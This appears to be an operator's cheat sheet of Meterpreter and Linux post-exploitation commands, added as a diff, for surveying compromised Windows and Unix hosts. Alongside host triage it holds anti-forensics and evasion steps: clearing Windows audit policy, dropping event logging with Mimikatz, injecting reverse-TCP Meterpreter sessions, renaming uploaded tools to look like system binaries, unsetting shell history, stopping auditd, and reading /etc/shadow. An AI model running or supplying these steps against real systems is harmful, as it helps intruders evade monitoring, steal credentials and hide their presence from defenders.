@@ -1,0 +1,1365 @@
+
+``` METERPRETER ``` {
+=========================================================================================================================
+# the survey <<< use >>> {
+ 
+#What is the date/time on remote target?
+localtime
+getpid
+getuid
+pwd
+#What is 
+	the hostname of the remote target? 
+	the OS (include version, build, and service pack)? 
+	the system architecture? 
+	the system language? 
+	the workgroup/domain? 
+sysinfo
+#What is the IP and MAC address of remote target? 
+ipconfig
+
+	netstat
+	ps
+
+#Is auditing enabled or not? If so, what events are enabled? 
+run multicommand -cl 'cmd /c auditpol /get /category:*'
+# AUDITPOL disable {
+
+# confirm no exist 
+ls 'c:\windows\temp\MpSvcStub.log'
+
+# backup
+run multicommand -cl 'auditpol /backup /file:c:\windows\temp\MpSvcStub.log'
+
+# clear audit rules 
+run multicommand -cl 'auditpol /clear /y'
+
+# verify rules cleared 
+run multicommand -cl 'auditpol /get /category:*'
+
+# download backup of Rules
+download c:/windows/temp/MpSvcStub.log /tmp
+
+# delete copy off target
+del c:/windows/temp/MpSvcStub.log
+
+# upload & reenable auditpol
+upload /tmp/MpSvcStub.log
+run multicommand -cl 'auditpol /restore /file:MpSvcStub.log'
+run multicommand -cl 'auditpol /get /category:*' 
+rm MpSvcStub.log
+}
+	
+# upgrade to x64 {
+
+# do before upgrading 
+run post/windows/gather/enum_logged_on_users  
+	``` !!! crashes 64bit meterpreter session !!!```
+
+run post/windows/manage/archmigrate SESSION=1 IGNORE_SYSTEM=true
+
+}
+
+# EVENT logging disable {
+load kiwi
+kiwi_cmd "privilege::debug"
+kiwi_cmd "event::drop" 
+
+}
+
+# duplicate session {
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=<> LPORT=42501 SESSION=1 HANDLER=true
+
+}
+
+#What is the value of %windir% (and other environment variables)?
+run post/multi/gather/env
+#How much Total and Free physical memory is present on the target host?
+run multicommand -cl 'systeminfo'
+#List your backdoor connection information (remote IP and port, PID, UID and working directory) 
+	- netstat,getpid,getuid,pwd (and info from your opening session line)
+#What privileges are enabled for the UID you are running under? 
+run multicommand -cl 'whoami /priv'
+#Which DNS server(s) does the host use? 
+run multicommand -cl 'netsh interface ip show config'
+#What is the primary gateway and netmask of the remote target? 
+route
+
+----------------------------------------------------INIT TRIAGE---------------------------------------------------------
+#Are there any executables that appears to be malicious or security-related (list their corresponding PID and full path)? 
+netstat 
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe" | findstr /v "dns.exe" ' # if DC/DNS server 
+	run multicommand -cl 'cmd /c netstat -anob'
+
+#Review the process list. Are there any network services running? If so, what are they? 
+ps
+run post/windows/gather/wmic_command COMMAND='process get commandline' 
+	run multicommand -cl 'cmd /c tasklist /m'
+run multicommand -cl 'cmd /c tasklist /svc'
+
+
+
+# check handles {
+cd c:/windows/temp
+upload handle.exe hnetcfg.exe
+run multicommand -cl 'hnetcfg.exe -p 1684 -a /accepteula'  # process ID/ PID/ proc name 
+	handle -a # ALL handles
+del c:/windows/temp/hnetcfg.exe 
+	# close handle to an open file 
+	hnetcfg.exe -c <> -p <PID> -y
+
+# on exit 
+reg enumkey -k "HKU\.Default\Software\Sysinternals" 
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+
+}
+
+# check process DLLs (espec If SUS .dll process/port) {
+run multicommand -cl 'cmd /c tasklist /FI "PID eq <>" /m'
+# 2. review system32/syswow64 dlls. Pay attention to recent/out of place timestamps & google dlls 
+run multicommand -cl 'cmd /c dir c:\windows\system32\*.dll /od /tw'
+run multicommand -cl 'cmd /c dir c:\windows\syswow64\*.dll /od /tw' 
+# 3. check unsigned sig dlls
+upload listdlls.exe lpksetup.exe
+run multicommand -cl 'cmd /c lpksetup.exe [PID] /accepteula' 
+run multicommand -cl 'cmd /c lpksetup.exe -u [PID]' 
+del lpksetup.exe
+
+# on exit 
+reg deletekey -k "HKU\.Default\Software\Sysinternals"
+
+}
+
+# check services (sus svchost.exe?!) {
+run multicommand -cl 'cmd /c tasklist /FI "PID eq <>" /svc'
+run multicommand -cl 'tasklist /svc'
+	compare running service to sus pid 
+search -f *ServiceName*
+	e.g. search -f *FastUserSwitchingCompatibility*
+
+# view services in detail 
+upload psservice.exe 
+psservice.exe  	
+
+--- especially applies if suspicious proc runs under svchost.exe - but can't tie to an installed service/ reg key 
+
+}
+
+# search similar times 
+run multicommand -cl 'cmd /c dir /tc <>'
+run multicommand -cl 'cmd /c dir c:\ /S /A /tc | findstr /c:"MM/DD/YYYY"'
+----------------------------------------------------END TRIAGE----------------------------------------------------
+
+#List the names of logged-on users, how long they have been idle and which users have recently logged on. 
+run multicommand -cl 'query user'
+	run post/windows/gather/enum_logged_on_users  ``` !!! crashes 64bit meterpreter session !!!``` # assuming ran earlier
+idletime
+
+#List any services set to run at boot/login 
+run post/windows/gather/enum_services
+load extapi 
+service_enum
+
+#List any scheduled tasks related to malware or security 
+run multicommand -cl 'schtasks /query' 
+
+#List installed third-party (non-Microsoft) applications 
+run post/windows/gather/enum_applications
+#Are there any installed security products that are enabled? 
+run getcountermeasure 
+	ps
+	- plus a review of the process list, startup programs, and installed programs and services
+	
+#If there is a firewall present, what is it's status? 
+run multicommand -cl 'netsh advfirewall show currentprofile'
+# download rules to review
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all status=enabled' -f /tmp/T<>-fwrules
+#List the drives that are present on the target host 
+show_mount
+#List the network shares on the target host 
+run multicommand -cl 'net share'
+
+# [[ REG KEY CHECKS ]] { 
+
+#CHECK POWERSHELL VERSION
+reg enumkey -k 'HKLM\software\microsoft\powershell\1\powershellengine'
+reg queryval -k 'HKLM\software\microsoft\powershell\1\powershellengine' -v powershellversion
+   # Versions older than 4.0 probably are not logging
+reg enumkey -k 'HKLM\software\policies\microsoft\windows\powershell\transcription'
+reg queryval -k 'HKLM\software\policies\microsoft\windows\powershell\transcription' -v EnableTranscripting
+reg queryval -k 'HKLM\software\policies\microsoft\windows\powershell\transcription' -v outputdirectory
+reg queryval -k 'HKLM\software\policies\microsoft\windows\powershell\transcription' -v 
+
+#LIST SERVICES SET TO RUN AT BOOT/STARTUP AND REGISTRY KEYS.
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+	reg queryval -k 'HKLM\software\microsoft\windows\currentversion\run' -v
+
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+	reg queryval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce' -v
+
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx'
+
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\run'
+	reg queryval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\run' -v
+
+reg enumkey -k 'HKLM\Software\WOW6432Node\microsoft\windows\currentversion\run'
+	reg queryval -k 'HKLM\Software\WOW6432Node\microsoft\windows\currentversion\run' -v
+
+reg enumkey -k 'HKLM\Software\WOW6432Node\microsoft\windows\currentversion\runonce'
+	reg queryval -k 'HKLM\Software\WOW6432Node\microsoft\windows\currentversion\runonce' -v
+
+reg enumkey -k 'HKLM\Software\WOW6432Node\microsoft\windows\currentversion\runonceex'
+
+reg queryval -k 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' -v Shell 
+reg queryval -k 'HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon' -v Shell 
+
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'  
+
+reg queryval -k 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\' -v AppInit_DLLs
+reg queryval -k 'HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\' -v AppInit_DLLs
+
+reg enumkey -k 'HKLM\SYSTEM\currentcontrolset\services'
+reg queryval -k 'HKLM\SYSTEM\currentcontrolset\services' -v 
+
+# HKCU / HKU CHECKS 
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\run'
+reg queryval -k 'HKCU\software\microsoft\windows\currentversion\run' -v
+
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+reg queryval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' -v
+
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx' 
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
+reg enumkey -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
+
+
+	reg enumkey -k 'HKU'
+	reg enumkey -k 'HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\Run'
+	reg queryval -k 'HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\Run' -v
+
+	reg enumkey -k 'HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+	reg queryval -k 'HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\RunOnce' -v
+
+
+}
+
+#What user accounts are present on the system?
+run multicommand -cl 'net users'
+#What groups are present on the system and what users are members of the administrators group? 
+run multicommand -cl 'net localgroup'
+run multicommand -cl 'net localgroup administrators'
+``` IF DOMAIN CONTROLLER ```
+run multicommand -cl 'net group "Domain Admins"'
+#What is the account lockout policy? 
+run multicommand -cl 'net accounts'
+#Are there any event log entries related to your operations? 
+
+``` CHECK ALL 4 ``` 
+run multicommand -cl 'wevtutil qe SYSTEM /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SECURITY /c:35 /rd:true /f:text' # auditpol removal gets logged
+run multicommand -cl 'wevtutil qe APPLICATION /c:15 /rd:true /f:text' ``` notable apps running? from weird dirs? ```
+run multicommand -cl 'wevtutil qe "Windows PowerShell" /c:10 /rd:true /f:text'
+	run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+
+#Are there any files with a .doc(x), .xls(x), .ppt(x), or .pdf extension? If so, what directories are they primarily in? 
+search -f *.doc
+search -f *.xls
+search -f *.ppt
+search -f *.pdf
+	# NOTE: ADDITIONAL (CUSTOM) DRIVES = USER/LOCAL DRIVES for file grabbing
+	
+#Are there any other log files related to your activities? If so, what is their full path and name? 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw' 
+	run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw' -f /root/T<>logsearch
+	#ANY LOG today
+	run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "MM/DD/YYYY"'
+	
+#Are there any error logs or dump files related to your activities? If so, what is their full path and name? 
+search -f *.wer 
+	run multicommand -cl 'cmd /c dir c:\*.wer /S /A'
+	search -f *.wer -f /root/T<>werlogsearch
+search -f *.dmp
+	run multicommand -cl "cmd.exe /c dir c:\\*.*dmp /S /A"
+
+	run multicommand -cl 'cmd /c dir c:\*.wer /S /A | findstr "MM/DD/YYYY"'
+	run multicommand -cl 'cmd /c dir c:\*dmp /S /A | findstr "MM/DD/YYYY"'
+
+	and then review corresponding log files if they have a mod/write time of when you were active on the host.)
+
+# ANYTHING MOD today 
+run multicommand -cl 'cmd /c dir c:\ /S /A | findstr "MM/DD/YYYY"'
+
+# review directories 
+ls -t c:/windows/temp 
+	- anything new? sus? .bat? 12341512?
+MpCmdRun.log
+MpSigStub.log
+
+--- check user dirs
+
+}
+
+# basic survey # ``` POST EXPLOIT / JUMP BOX``` {
+localtime
+getuid 
+getpid 
+ipconfig
+sysinfo
+netstat 
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"' # if DC/DNS server 
+ps
+route
+run post/windows/gather/enum_logged_on_users  ``` !!! crashes 64bit meterpreter session !!!```
+idletime # windows only 
+show_mount # windows only 
+	shell 
+	iptables -nvL
+
+}
+
+=========================================================================================================================
+}
+
+``` NIX ``` {
+=========================================================================================================================
+``` --------- SURVEY --------- ``` # REQUIRES ROOT  # {
+------------------ init SA checks ------------------
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w; id; uname -a; date; date -u; date +%s; pwd; ps -p $$
+
+su - root
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w; id; uname -a; date; date -u; date +%s; pwd; ps -p $$
+
+ip addr || ifconfig -a
+cat /etc/*elease* # OS/ distro? 
+netstat -rn 
+ip neigh | arp -n
+env
+
+# logs on entry: 
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -10 -type f -print0 | xargs -0 ls -latr 
+
+
+# sec checks (selinux, auditd/psacct) 
+sestatus 
+	cat /etc/selinux/semanage.conf
+ps -ef | egrep "audit|psacct"
+service auditd status
+	svcs auditd // systemctl status auditd.service // systemd status auditd 
+# stop auditd {
+ls -latr /var/log/audit/audit.log
+tail -n10 /var/log/audit/audit.log
+date -d "@<epoch>"
+
+service auditd stop
+	# creates entry!!! but less to clean in the end --- do NOT run the script when exiting
+}
+
+--- SA checks 1.5  --- 
+lsb_release -a
+cat /proc/cpuinfo	
+locale 
+uptime 
+
+
+------------------ procs / conns -----------------
+netstat -tunap
+		// is anything off? e.g. if it looks off, investigate. dont assume normal e.g. port 873 listening from rsync with pid 1 
+	netstat -an # Solaris 
+	
+ps -eaf || ps aux www
+	ps -efT || ps -ef --sort start_time 
+	# closely examine newest ran procs / scripts //
+	ps -efH 
+	# any suspicious parents/children/wrong-space proc? 
+
+# DNS
+hostname
+cat /etc/hosts 
+cat /etc/resolv.conf
+
+------------------ secondary SA checks ------------------
+last -i
+	^^ # use IPs instead of names
+	lastb -20
+	lastlog
+
+mount
+cat /etc/fstab
+free 
+	df -h; df -i 
+	
+------------------ modules & firewall ------------------
+# modules 
+lsmod 
+	cat /proc/modules
+lsmod | grep ipt || cat /proc/modules | grep ipt
+	modinfo –c # Solaris 
+	
+# firewall 
+iptables -nvL
+iptables -nvL -t nat 
+	``` note: -t MANGLE or -t RAW could load additional modules. rmmod to remove. JUST DONT RUN.``` 
+	ipfstat -io # Solaris 
+	
+------------------ list packages ------------------
+dpkg -l
+# run specific os below 
+	dpkg --get-selections
+apt list --installed # Debian / Ubuntu
+rpm -qa # RHEL/CentOS 
+		yum list installed # uses net??  
+	pkginfo -i # Solaris/ Unix
+
+
+``` ------------------------------------- START PERSISTENCE CHECKS ------------------------------------- ```
+
+------------------ scheduled tasks (cron, anacrontab, at) ------------------ # inspect each 
+# 1. cron system and user jobs ~~~ /etc/cron.d/ == root only 
+cat /etc/crontab
+ls -latr /etc/cron.*
+	for i in $(find /etc/cron.daily); do echo "------------------------------------------------$i------------------------------------------------"; cat $i; done 
+ls -altr /etc/cron.d/ 
+find /etc/cron.d/ 
+	!! cat each one !! 
+ls -latr /var/spool/cron/* 
+find /var/spool/cron/
+	for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
+# 2. anacrontab --- if anything here, REMEMBER IT 
+cat /etc/anacrontab 
+
+# 3. at 
+ls -latr /var/spool/at  
+	# look for /var/spool/
+	
+# 4. rc.local check 
+cat /etc/rc.local 
+
+------------------ boot services ------------------
+# runlevel 
+who -r
+runlevel 
+cat /etc/inittab
+	# systemd 
+	journalctl -b --no-pager | grep "Reached target"
+
+# startups 
+service --status-all
+	# rhel/centos/fedora
+	chkconfig --list
+	# systemd
+	systemctl list-units --all --no-pager
+	systemctl list-unit-files --type=service --state=enabled
+		systemctl list-unit-files --type=service --no-pager | grep "--state=enabled"
+ls -latr /etc/init.d/
+	cat /etc/init.d/<sus-init>
+	for i in $(find /etc/init.d); do echo "------------------------------------------------$i------------------------------------------------"; cat $i; done
+
+
+------------------ user info ------------------ 
+# user configs 
+cat /etc/passwd 
+	cat /etc/passwd | grep -v "nologin"
+cat /etc/shadow 
+	getent passwd # LDAP accounts/auth?	
+cat /etc/group
+	getent group 
+cat /etc/sudoers
+cat /etc/profile
+
+# /root - FoI & malware checks 
+ls -latr /root 
+cat /root/.bash_history 
+	less /root/.history 
+
+# user dirs - FoI & malware checks 
+ls -latr /home/* 
+	# NOTE interesting / sussy files or subdirs (e.g. ...)
+ls -latr /home/<userdir>/.bash_history # or  .history 
+for i in `ls /home`; do echo ====================$i HIST ====================; cat /home/$i/.bash_history; done
+	cat /home/<usr>/.bash_history 
+
+	``` if users do NOT have .bash_history, manually verify they have no other HISTFILE```
+
+
+------------------ malware, config, binary checks ------------------ # (check for system command tampering)
+ls -latr / 
+	ls -latr /export/home # mounted user dirs 
+	ls -latr /export/home/*
+ls -latr /tmp 
+ls -latr /etc
+	#!!!
+ls -latr /bin/
+ls -latr /sbin/
+ls -latr /usr/bin/
+ls -latr /usr/sbin/
+ls -latr /usr/local/bin/
+ls -latr /usr/local/sbin/
+
+# dig deep into webdir & subdirs and LOOK, especialy /var/www. missed a ... dir in user dir...
+find /home -iname *.txt 
+find /home -iname *.sh
+ find / -iname *...*
+ls -latr /var/www/
+
+------------------ logging ------------------
+# what logs? 
+ls -la /etc/*syslog*
+cat /etc/syslog.conf || cat /etc/rsyslog.conf 
+	cat /etc/rsyslog.d/50-default.conf # ubuntu 
+
+# when logs?
+cat /etc/logrotate.conf 
+ls -latr /etc/logrotate.d/
+	cat /etc/logrotate.d/rsyslog
+	
+# CHECK logs
+	ls -latr /var/*log*/ /var/*acc* /var/account/* /var/log/audit
+ls -latrd -1 "/var/log"/{*,.*} /var/account/* /var/log/audit
+	ls -latr /var/adm # Solaris 
+
+	
+# READ logs 
+tail -n30 /var/log/[log]
+	
+# log presence
+egrep -r "<IP>" /var/log 
+	<IP>|<PID>|<TIMESTAMP>|<PORT>
+	
+	find /var/log -type f -mmin -10 2>/dev/null #  or wait confirm with last presence check 
+
+# systemd = journald EVERYTHING {
+
+# review conf (storage mode/enabled) 
+cat /etc/systemd/journald.conf 
+journalctl --header
+	/run/log/journal* = in memory/nonpersistent 	
+	/var/log/journal* = on disk/ 
+
+# view log 
+journalctl --no-pager 
+journalctl -b --no-pager  # current boot 
+
+# check presence 
+journalctl --since "YYYY-MM-DD HH:MM:ss"
+
+# parse messages 
+egrep -v "kernel|dbus" /var/log/messages | tail -n 50 
+
+}
+
+
+------------------ presence check  ------------------ 
+
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<TIME> -type f -print0 | xargs -0 ls -latr 
+	# any additional residue? loggers? 
+}
+
+``` --------- PROSECUTE --------- ``` {
+file <file>   # gives file type and build info
+
+strings <file | less   #print readable chars in a file
+strings <file> | egrep -i "INET|AF|SOCK|BIND|BACKDOOR|ssh"
+man <file> 	# if gook, def malware 
+cat <file> | md5sum # Virustotal check 
+
+#pull a binary from proc mem
+ldd <file>   #lists dynamic libraries loaded by proc
+
+# find log files 
+lsof -Pnp <pid>
+	lsof -Pnp `echo /proc/*` | less
+	pfiles <pid> # Solaris 
+	pfiles `echo /proc/*` | less # list all files per ports // search for port to identify: binary/service path and PID 
+-P: dont resolve port numbers
+-n: dont resolve hostnames
+-p: selects based on PID 
+
+# system-find.prosecute - locate init scripts, crons, configs, hijack binares for /path/to/susp/proc
+find / -type f ! -path "/proc/*" ! -path "/dev/*" ! -path "/boot/*" ! -path "/sys/*" ! -path "/selinux/*" -exec grep -l "/path/to/sus" {} \;
+	// after, may also want to use file name (not full path)
+	# if root, remove sudo or: logs/sometimes no perm
+
+# persistence search using binary/script timestamps 
+find / -newermt "2018-01-18" ! -newermt "2018-01-19"
+
+locate <string> 
+
+{ # /proc reference - shows all processes with associated files
+	-maps: shows shared objects mapped to process memory
+	-exe: a copy or link to binary used to execute process
+	-cmdline: the command w/ args that started the proc
+	-cwd: the current working dir
+	-fd: show file descriptors in use by proc
+}
+
+
+}
+
+# JUMP SURVEY {
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w; id; uname -a; date; date -u; date +%s; pwd; ps -p $$
+	ip addr || ifconfig -a
+/sbin/ip a
+cat /etc/*elease*
+last -i 
+uptime 
+	lsmod
+/sbin/lsmod
+free 
+hostname 
+netstat -tuna
+ps -eaf
+
+cat /etc/crontab
+ls -latr /etc/cron.*
+	for i in $(find /etc/cron.daily); do echo "------------------------------------------------$i------------------------------------------------"; cat $i; done 
+	
+# check FW rules?
+sudo -l
+iptables -nvL
+
+
+# optional 
+service auditd status 
+	/sbin/service auditd status
+sestatus 
+	/sbin/sestatus
+
+
+}
+
+# ADD. SURVEYS {
+
+# FEEDBACK SURVEY  { 
+
+# auditd check {
+service auditd status 
+
+# stop auditd 
+ls -latr /var/log/audit/audit.log
+tail -n10 /var/log/audit/audit.log
+date -d "@<epoch>" # save time of last entry
+
+service auditd stop
+	# created entry with time Fri Jul 21 20:15:06. same as modified timestamp 
+
+}
+
+#What timezone is the system using?
+date
+#What is the system kernel version 
+uname -a 
+#What processor is being used on the system? 
+cat /proc/cpuinfo || uname -a 
+#What is the OS version? 
+lsb_release -a
+#What is the system language?  
+locale 
+#Who are the current logged-on users, if any? 
+w
+	who or last
+#Who were the most recent logged-on users (past 48 hours)? 
+last
+#How long has the system been running? 
+uptime
+#Is SELinux enabled and if so, what mode is it in? 
+sestatus
+#What modules are currently loaded? 
+lsmod
+#What is the available system memory? 
+free 
+#What is the hostname and fully qualified domain name of the system? 
+hostname 
+#What are the IP, MAC addresses and netmasks of all interfaces (not including localhost)?
+ifconfig -a
+#Which DNS server(s) does the host use? 
+cat /etc/resolv.conf
+#What is the default gateway of the remote target?
+netstat -rn
+#Review the list of network sockets and connections. Are there any suspicious network connections or sockets (listed by local port/remote IP/remote port)? 
+netstat -natup // No suspicious sockets or connections noted.
+#Review the process list. Are there any suspicious processes (listed by PID/Parent PID, owner, and full path)?
+ps -eaf 
+#Are there any suspicious files, directories, or suspicious (or recent) changes to system configuration files? 
+ls -latr /etc
+#Are there any cron jobs scheduled to run during the timeframe of your operation, if so which ones? 
+ls -al /etc/cron.*
+ls -al /var/spool/cron 
+#What network services (if any) are running (web server, database server, etc.)?
+netstat -natup
+#What firewall rules are enforced on the host and what are the default Chain Policies? 
+iptables -nL 
+	There is a rule that logs SSH connections. Policies are: ACCEPT for all 3 chains.
+#Are there any installed security products that are enabled? 
+	No security products of interest are installed. We don't include SELinux or IPtables.
+#Are there any logs that contain your activities? If so, which logs? 
+	grep "somestring" /var/log/secure and messages logs There should be some evidence of your activities in both the secure and messages log files (as well as the audit.log)
+#Review the syslog and logrotate config files to help determine what is being logged on the system, if the system sends or receives log information and the logrotation schedule of system log files. 
+cat /etc/syslog.conf
+cat /etc/rsyslog.conf 
+cat /etc/logrotate.conf
+
+ls -al /etc/logrotate.d 
+	(then review any specific file in that dir) No syslog server in evidence
+#Determine the default run-level and which services are set to run at startup. 
+cat /etc/inittab
+	# systemd 
+	journalctl -b --no-pager | grep "Reached target"
+	systemctl list-unit-files --type=service --state=enabled
+	
+#Obtain a list of packages have been installed on the system? 
+rpm -qa # RHEL/CentOS 
+	yum list installed # uses net?? 
+apt list --installed # Debian 
+	dpkg --get-seletions
+pkginfo -i # Solaris/ Unix
+
+#Does rc.local contain any custom commands?
+cat /etc/rc.local 
+#List the mounted devices and mount points that are present on the target host
+cat /etc/fstab 
+	looking at /proc/mounts only shows what is currently mounted
+#Review other config files and system directories in the /etc directory.
+ls -latr /etc 
+#List the contents (files and sub-directories) of /root, /home, /tmp (and any other directory you deem important). 
+
+#Note the user and system accounts on the system
+cat /etc/passwd
+#Do any of the users have sudo permissions? If so, which accounts and what sudo permissions do they have? 
+cat /etc/sudoers 
+#Review the contents of both root and other user's .bash_history
+cat .bash_history
+#Are there any indications a user account uses secure shell, telnet or rlogin from this host? If so, what IP addresses do they connect to? 
+
+#Are there any other indications that a user account has root privileges (sudo, su etc.)? If so, which account?
+
+#What is the purpose of this host (workstation, laptop, database server, application server, DNS server, etc.)?
+
+
+}
+
+# methodology reference {
+Triage:
+- strange/malformed name? 
+- Filepath. Start from weird location?
+- weird options/arguments? 
+- unexpected ancestors/PPIDs?
+- Start sooner/later than expected? e.g. apache early or crond after user login 
+- ran by funky users?
+
+Persistence:
+- system startup (before basic.target / part of sysinit line of /etc/inittab) 
+- userspace startup (multi/graphic target or SysV /etc/rc.d) 
+- scheduled jobs (cron, anacron, atd)
+- user login (login scripts)
+
+Timestamps:
+- what users are involved (last logins)
+- how proc was put into system (install logs/history files)
+- IP addresses associated w/activity or access vector- refernce log info (iptables logging, misc logs w timestamp)
+
+
+
+}
+
+# nix user->root survey (user/root) {
+
+``` --------- USER TRIAGE --------- ``` # <<< use >>> # {
+------------------ init SA checks ------------------
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w; id; uname -a; date; date -u; date +%s; pwd; ps -p $$
+ip addr || ifconfig -a
+	/sbin/ip a
+	
+cat /etc/*elease*
+netstat -rn 
+ip neigh | arp -n
+	/sbin/ip neigh
+env
+
+# sec checks (selinux, auditd/psacct) 
+sestatus 
+	cat /etc/selinux/semanage.conf
+ps -ef | egrep "audit|psacct"
+service auditd status
+	svcs auditd // systemctl status auditd.service // systemd status auditd 
+# stop auditd {
+ls -latr /var/log/audit/audit.log
+tail -n10 /var/log/audit/audit.log
+date -d "@<epoch>"
+
+service auditd stop
+	# creates entry!!! 
+}
+
+--- SA checks 2  --- 
+lsb_release -a
+cat /proc/cpuinfo	
+locale 
+uptime 
+
+
+------------------ procs / conns -----------------
+netstat -tuna
+	# do NOT use -p unless root --- otherwise may log w/selinux 
+		// is anything off? e.g. if it looks off, investigate. dont assume normal e.g. port 873 listening from rsync with pid 1 
+	netstat -an # Solaris 
+	
+ps -eaf || ps aux www
+	ps -efT || ps -ef --sort start_time 
+	# closely examine newest ran procs / scripts //
+	ps -efH 
+	# any suspicious parents/children/wrong-space proc? 
+
+# DNS
+hostname
+cat /etc/hosts 
+cat /etc/resolv.conf
+
+------------------ secondary checks ------------------
+last -i # use IPs instead of names
+	# lastb when root
+	lastlog
+
+mount
+cat /etc/fstab
+free 
+	df -h; df -i 
+	
+------------------ boot services ------------------
+who -r
+	runlevel 
+cat /etc/inittab
+	# systemd 
+	journalctl -b --no-pager | grep "Reached target"
+	systemctl list-unit-files --type=service --state=enabled
+
+
+service --status-all
+# rhel/centos/fedora
+chkconfig --list
+# systemd
+systemctl list-unit-files --type=service --state=enabled
+
+------------------ list packages ------------------
+rpm -qa # RHEL/CentOS 
+	yum list installed # uses net?? 
+apt list --installed # Debian 
+	dpkg -l
+	dpkg --get-selections
+pkginfo -i # Solaris/ Unix
+
+------------------ scheduled tasks (cron, anacrontab, at) ------------------ # inspect each 
+# 1. cron system and user jobs ~~~ /etc/cron.d/ == root only 
+cat /etc/crontab
+# may need sudo/root for cat (sometimes dont)
+for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
+ls -latr /etc/cron.*
+ls -latr /var/spool/cron/* 
+	!! cat each one !! 
+
+# 2. anacrontab 
+cat /etc/anacrontab 
+
+# 3. at 
+ls -latr /var/spool/at  
+	# look for /var/spool/
+	
+# 4. rc.local check 
+cat /etc/rc.local 
+
+------------------ user dirs ------------------ 
+ls -latr / 
+ls -latr /root 
+ls -latr /home
+ls -latr /home/*/* # doesnt show .hidden files
+ls -latr /export/home # may be mounted user dirs 
+ls -latr /export/home/*
+
+# root/ user accounts 
+
+cat /etc/profile # global login script
+cat ~/.bash_history 
+cat /root/.bash_history 
+	less /root/.history 
+# user histories 
+	
+------------------ malware, config, binary checks ------------------ # (check for system command tampering)
+ls -latr /tmp 
+ls -latr /etc
+	#!!!
+ls -latr /bin/
+ls -latr /sbin/
+ls -latr /usr/bin/
+ls -latr /usr/sbin/
+ls -latr /usr/local/bin/
+ls -latr /usr/local/sbin/
+
+------------------ logging ------------------
+ls -la /etc/*syslog*
+cat /etc/syslog.conf || cat /etc/rsyslog.conf 
+	cat /etc/rsyslog.d/50-default.conf # ubuntu 
+# all logs
+ls -latr /var/*log*/ /var/*acc* /var/account/* /var/log/audit 
+ls -latr /var/adm # Solaris 
+# print check 
+egrep -r "<IP>" /var/log 
+
+	# for log finds - omit /run /proc /sys
+
+# systemd = journalctl for everything. -b for current boot 
+
+# review conf (storage mode/enabled) 
+cat /etc/systemd/journald.conf 
+journalctl --header
+
+journalctl --no-pager 
+journalctl -b | less 
+	/run/log/journal* = in memory/nonpersistent 	
+	/var/log/journal* = on disk/ 
+
+# check presence 
+journalctl --since "YYYY-MM-DD HH:MM:ss"
+
+# parse messages 
+egrep -v "kernel|dbus" /var/log/messages | tail -n 50 
+
+# presence check // run later if have root, or add sudo to ls -latr 
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<duration since initial connection> -type f -print0 | xargs -0 ls -latr 
+
+
+}
+
+``` --------- ROOT TRIAGE --------- ``` # <<< use >>> # {
+
+su root 
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w
+
+# lasts 2
+	lastb -20
+
+# connections 2 -p now!
+netstat -tunap 
+
+# modules 
+lsmod 
+	cat /proc/modules
+lsmod | grep ipt || cat /proc/modules | grep ipt
+	modinfo –c # Solaris 
+	
+# firewall 
+iptables -nvL
+iptables -nvL -t nat 
+	``` note: -t MANGLE or -t RAW could load additional modules. rmmod to remove. JUST DONT RUN.``` 
+	ipfstat -io # Solaris 
+
+# logs 2
+	find /var/log -type f -mmin -10 2>/dev/null 
+	# find me 
+	egrep -r "<IP>|<PID>|<TIMESTAMP>|<PORT>" /var/log 
+
+ls -latr /var/log/*
+	tail -n30 /var/log/[log]
+		# consider syslog for rerunning suspic. procs, kern.log for recurring sus iptables logs 
+cat /etc/rsyslog.d/*.conf
